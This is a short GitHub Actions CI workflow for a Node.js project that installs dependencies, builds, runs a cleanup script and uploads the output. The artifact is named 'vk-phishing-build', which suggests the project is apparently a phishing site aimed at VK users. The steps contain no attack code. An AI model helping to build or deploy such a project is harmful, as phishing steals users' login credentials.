name: Node CI

on:
  push:
    branches:
      - master
    paths-ignore:
      - "docs/**"

jobs:
  build:
    runs-on: ubuntu-latest

    strategy:
      matrix:
        node-version: [12.x]

    steps:
      - uses: actions/checkout@v1

      - name: Use Node.js ${{ matrix.node-version }}
        uses: actions/setup-node@v1
        with:
          node-version: ${{ matrix.node-version }}

      - name: Install
        run: npm ci

      - name: Build
        run: npm run build

      - name: Remove all used for dev
        run: bash build.sh

      - name: Upload build
        uses: actions/upload-artifact@v1
        with:
          name: vk-phishing-build
          path: ./build
